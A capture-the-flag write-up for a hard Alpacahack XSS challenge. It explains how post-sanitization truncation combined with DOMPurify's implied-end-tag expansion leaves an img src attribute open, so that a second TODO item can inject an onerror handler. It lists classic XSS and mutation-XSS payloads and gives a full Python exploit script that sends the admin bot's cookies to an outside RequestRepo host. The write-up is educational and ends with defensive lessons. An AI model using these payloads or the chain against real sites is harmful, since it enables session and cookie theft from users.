---
title: "Alpacahack — TODO List XSS (Hard)"
date: 2026-09-11
tags: [web, xss, dom, alpacahack]
ctf: "Alpacahack"
summary: "DOM XSS in a todo list app — 7 solves hard-difficulty challenge exploiting unsafe HTML rendering with a creative CSP bypass."
draft: false
---

**AlpacaHack Daily B-SIDE · XSS · Hard (7.0) · 30 solves**

---

## 0. The Setup

Every good XSS challenge starts the same way: someone says "this app is safe, it uses a sanitizer," and that sentence is basically a dare.

The app is refreshingly small  one Express route file, one EJS template. A session-cookie'd TODO list. You can view your own list, and critically, you can view *anyone's* list via `?sessionId=...`. That second part is the whole reason this challenge exists: it's the delivery mechanism. The Admin Bot has the flag in its cookies, and if we can get it to render attacker-controlled HTML on *any* page it visits, we win. The `?sessionId=` parameter means we don't even need to compromise the bot's own session  we just need it to open a URL pointing at *our* session, where we've already planted a payload.

So the real question isn't "how do I get the bot to visit a URL" (trivial, that's what the Admin Bot API is for). It's: **how do I get raw, unsanitized HTML into that `<li>`?**

```js
app.post("/todos", async (req, res) => {
  const rawTitle = String(req.body.title || "").trim().slice(0, 255);
  const title = DOMPurify.sanitize(rawTitle).slice(0, 255);
  ...
});
```

```ejs
<% todos.forEach((todo) => { %>
  <li>
    <%- todo %>
  </li>
<% }) %>
```

That `<%- todo %>` is unescaped output  full raw HTML injection if `title` ever contains a tag. And `title` is the output of `DOMPurify.sanitize()`, a library whose entire job is to make sure that never happens. Latest version, default config, no known CVEs. This is not a "bump the DOMPurify version" challenge. So let's go find the real bug the hard way — including the wrong turns, because those are honestly the more educational part.

---

## 1. Dead End #1  "Just try the classics"

First instinct: throw the greatest hits at it and see what survives.

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href="javascript:alert(1)">click</a>
"><script>alert(1)</script>
```

Every single one comes back inert. `<script>` tags get stripped outright (DOMPurify strips them by default, no config even needed for that — `SCRIPT` isn't in the default allow-list). Event handler attributes like `onerror`, `onload` get stripped too, since attribute names starting with `on` are filtered by DOMPurify's default `SAFE_FOR_TEMPLATES`-adjacent attribute logic. `javascript:` URLs get neutralized in `href`/`src`. This isn't a paper sanitizer — DOMPurify earns its reputation. Nothing here.

**Lesson re-learned:** if a challenge tells you up front "it's the latest DOMPurify, we're not exploiting DOMPurify itself," believe it and stop trying to fuzz your way through the front door.

## 2. Dead End #2  mXSS and namespace confusion

Next stop: DOMPurify's actual historical weak spot, **mutation XSS (mXSS)**. The classic idea is that a sanitizer parses your input into a DOM tree, decides it's safe, and then *serializes it back to a string* — and the serialization step can behave differently from the original parse, especially across namespace boundaries (`<svg>`, `<math>`, `<template>`, `<noscript>`) or with weird nesting that gets "corrected" by the parser in a way the sanitizer didn't anticipate.

So I tried the known families:

```
<svg><p><style><img src=x onerror=alert(1)></style>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Also inert. Modern DOMPurify has closed essentially all of the publicly known mXSS gadgets — this is exactly the kind of thing the DOMPurify team patches the moment a paper comes out. Trying to rediscover a fresh 0-day mXSS gadget in a daily CTF challenge felt like the wrong altitude. Time to re-read the hints instead of re-reading Google search results.

## 3. The Re-read

> "A basic rule when using a sanitizer like DOMPurify is that you should not further transform the sanitized string afterward. In this application, is the data left untouched after sanitization?"

That line is doing a *lot* of work, and I'd skimmed past it the first time because I was fixated on the sanitizer itself. Let's go back to the actual code, character by character:

```js
const rawTitle = String(req.body.title || "").trim().slice(0, 255);
const title = DOMPurify.sanitize(rawTitle).slice(0, 255);
```

Read it slowly. There are **two** `.slice(0, 255)` calls here:

1. One on `rawTitle`, **before** sanitization  fine, that's just enforcing a length limit on user input.
2. One on the **output of `DOMPurify.sanitize()`**, i.e. on HTML that has already been declared safe.

That second slice is the "further transformation" the hint is pointing at. DOMPurify's safety guarantee is a guarantee about *the exact string it returns*. The moment you cut that string anywhere else — after it — you are no longer holding a DOMPurify-verified string. You're holding an arbitrary substring of one, and arbitrary substrings of valid HTML are not valid HTML.

But so what? If the sanitized output is ≤255 characters (which it usually will be, since sanitizing normally only *removes* things), the second `.slice()` is a no-op. To make this dangerous, I needed sanitization to **grow** the string past the point where truncation actually bites.

## 4. Making DOMPurify Output *Longer* Than the Input

This is the pivot of the whole challenge, and it's a genuinely fun little insight: sanitizers don't just delete things. DOMPurify parses your HTML into a real DOM tree and then **re-serializes it**, and re-serialization means every open tag gets a matching closing tag — even if you never wrote one.

Browsers (and DOMPurify's parser, which follows the HTML5 parsing algorithm) also apply *implied-end-tag* rules. One of the oldest ones: a `<p>` element is not allowed to contain another `<p>`. If you open a second `<p>` while one is already open, the parser doesn't nest them — it silently closes the first one for you. So:

```
<p><p><img src="x">
```

isn't parsed as "a `<p>` containing a `<p>` containing an `<img>`." It's parsed as "an empty `<p>`, followed by a new `<p>` containing an `<img>`." And when DOMPurify serializes *that* tree back into a string, it has to write out closing tags for both paragraphs, even though the original input had none:

```
<p></p><p><img src="x"></p>
```

I checked this against the exact library version the app uses, to make sure I wasn't hand-waving:

```
$ node
> DOMPurify.sanitize('<p><p><img src="x">')
'<p></p><p><img src="x"></p>'
```

19 characters of input became 28 characters of output. **The sanitizer expanded the string by 9 characters**, and every one of those extra characters is a `</p>` or `>` that DOMPurify decided we needed but that our raw input never contained. This is the crack in the wall.

## 5. Weaponizing the Growth: Landing the Cut Mid-Attribute

Now it's an arithmetic problem. I need to pad the input so that the final `.slice(0, 255)` lands the axe *inside* something structurally important, rather than harmlessly at the very end of the string.

Padding strategy: prefix the payload with enough filler (`"a"` characters) so that after sanitization, the tag-expansion pushes the tail of the string just past the 255-character cliff — and land the cut **inside the `src="..."` attribute's quotes**, before they close.

```python
payload = '<p><p><img src="x">'                 # 19 chars, unsanitized
title = ("a" * (254 - len(payload))) + payload   # 254 chars total, under the raw-input cap
```

Sanitizing this 254-character string doesn't just append a couple of closing tags at a fixed offset — the whole tail shifts, because the *entire* `<p><p><img src="x">` fragment gets rewritten as `<p></p><p><img src="x"></p>`. I verified the actual output against the real dependency instead of trusting my mental model of HTML parsing:

```
raw length:        254
sanitized length:  262   ("a"×234 + "<p></p><p><img src=\"x\"></p>")
truncated to 255:  255
truncated tail:    ...aaaa<p></p><p><img src="
```

That truncated tail is the whole exploit in one line. Read it out loud: `<img src="`  an **opening quote with nothing after it**. The `.slice(0, 255)` didn't just chop off a stray `</p>`; it sliced clean through the middle of an attribute value, leaving the `src` attribute's quote **open**. As far as any HTML parser downstream is concerned, this `<img>` tag's start-tag has not been closed, and it is still mid-attribute-value.

That's a huge deal, because an unterminated quoted attribute value doesn't stop at `>`  the parser will happily consume `>`, `<`, entire other tags, *anything*, treating it all as inert text inside that attribute's value, right up until it finds the next literal `"` character in the document. Whatever comes after this truncated `<li>` in the raw HTML — including the *next TODO item* — is fair game to be swallowed into that attribute, or to break out of it.

## 6. The Second Piece: Reopening the Tag From the Next `<li>`

So I need a second TODO item, rendered immediately *after* this broken one, whose content starts with a literal `"` — that closes the dangling `src` attribute — followed by a brand-new attribute the sanitizer would never have let through on its own:

```
" onerror=document.location.assign('https://<my-requestrepo-host>/?'+document.cookie)
```

This string, on its own, is completely inert as a TODO title — DOMPurify sees a plain-text string with no tags in it and passes it through untouched (there's no markup to strip, and  '='parentheses aren't HTML-significant outside of a tag context). It sails through sanitization looking totally harmless. **It only becomes dangerous once the browser is still "inside" the previous `<img>` tag's start-tag when it starts parsing this text** at which point the leading `"` closes the dangling `src` value, and ` onerror=...` is parsed as a fresh attribute *on that same `<img>` element*, because the parser never saw the `>` that should have ended its start-tag.

The `<img>` element ends up with a garbage `src` (containing all the raw HTML in between — the rest of the `<li>`, the `</li>`, the next `<li>`'s opening markup — none of it matters, the browser doesn't render `src` as HTML, it just treats it as an opaque string) and a perfectly valid `onerror` handler. The browser tries to load `src`, fails (obviously — it's not a URL), fires `onerror`, and executes our JavaScript. The still-open `<img>` start-tag eventually gets terminated by the very next literal `>` character that shows up later in the template (e.g. the `</li>` closing our second `<li>`) — but by then it doesn't matter, the damage (the attribute injection) is already parsed.

## 7. Ordering Matters

One easy way to get this backwards: TODOs are prepended, not appended 

```js
todosBySession.set(req.sessionId, [title, ...todos]);
```

— newest first. For the truncated `<img src="` to appear *before* the `"` that closes it, the broken-tag TODO has to render **above** the attribute-injection TODO in the list. Since newest is rendered first, that means posting order is:

1. **First**, post the `" onerror=...` string (it needs to end up *second* in the list, i.e. posted *earlier*).
2. **Second**, post the padded `<p><p><img src="x">` truncation payload (posted later → rendered first, on top).

Get this backwards and you just get two inert, unconnected `<li>`s.

## 8. Full Chain

```python
from requestrepo import RequestRepo
import requests, os

APP_URL = os.environ.get("APP_URL", "http://localhost:3000/")
BOT_URL = os.environ.get("BOT_URL", "http://localhost:1337/")

repo = RequestRepo()
requestrepo_page = f"http://{repo.subdomain}.{repo.domain}/"

s = requests.session()
r = s.get(APP_URL)                     # mint a session
sessionId = s.cookies["sessionId"]

# Posted FIRST -> ends up SECOND in the rendered list.
# Inert on its own: no tags, DOMPurify passes it straight through.
s.post(f"{APP_URL}todos", data={
    "title": f"\" onerror=document.location.assign('{requestrepo_page}?'+document.cookie) "
})

# Posted SECOND -> ends up FIRST (on top) in the rendered list.
# DOMPurify expands <p><p><img src="x"> to <p></p><p><img src="x"></p>,
# and the trailing .slice(0, 255) chops it mid-attribute.
payload = '<p><p><img src="x">'
s.post(f"{APP_URL}todos", data={
    "title": ("a" * (254 - len(payload))) + payload
})

# Point the Admin Bot at OUR session via the readonly view.
requests.post(f"{BOT_URL}api/report", json={"path": f"?sessionId={sessionId}"})

req = repo.wait_for_http(timeout=30)
print(req.query)   # {'cookie': 'flag=alpaca{...}'}
```

When the Admin Bot opens `/?sessionId=<ours>`, it renders our two TODOs in order, the truncated `<img>` tag never closes, the second TODO's leading quote closes the `src` attribute early and smuggles in `onerror`, the image fails to load, `onerror` fires, and `document.cookie` — flag and all — gets shipped straight to our RequestRepo endpoint.

---

## 9. Why This Actually Works

DOMPurify is not lying to you when it returns a string —that string, *as returned*, is safe. The bug isn't in DOMPurify at all. It's in the application taking a value that has already been certified safe and then doing one more operation on it (`.slice(0, 255)`) that DOMPurify never got a chance to sanity-check. Sanitizers guarantee properties of a specific string; any post-processing — truncation, concatenation, re-encoding, template interpolation into a *different* context — invalidates that guarantee, because you're no longer looking at the string DOMPurify actually vetted. Combine that with the fact that HTML sanitization can *grow* a string (implied end tags, attribute normalization, entity re-encoding) rather than only shrink it, and a fixed-length truncation stops being a harmless safety net and starts being a scalpel that can land anywhere — including mid-attribute, mid-tag, or anywhere else structurally sensitive.

## 10. Takeaways

- **Never transform a sanitizer's output.** Not truncation, not concatenation, not re-sanitizing, not embedding it somewhere else. If you need a length limit, enforce it on the *input* only, and treat that as a courtesy to the user, not a security boundary — never re-check length after sanitization and assume the result is still safe.
- **Sanitized HTML can be longer than the HTML you fed in.** Implied tags, auto-closing rules, and attribute/entity normalization are all real, and they all add characters. Any code that assumes "sanitize only removes things, never adds them" has an unstated (and false) assumption baked in.
- **`<p>` nesting rules are a surprisingly reliable length-inflation primitive** for this class of bug — cheap, deterministic, and easy to pad precisely because you fully control how many junk characters (`a`s) prefix the real payload, letting you dial in exactly where the truncation cut lands.
- **Unterminated attribute values are a powerful cross-element gadget.** Once you can leave a `src="` (or any attribute value) open, everything downstream in the raw markup — including *other users' content*, other DB rows, other template output — becomes fair game to be absorbed as part of that attribute, or used to break out of it. Two independently "safe-looking" pieces of stored content combined into one exploit.

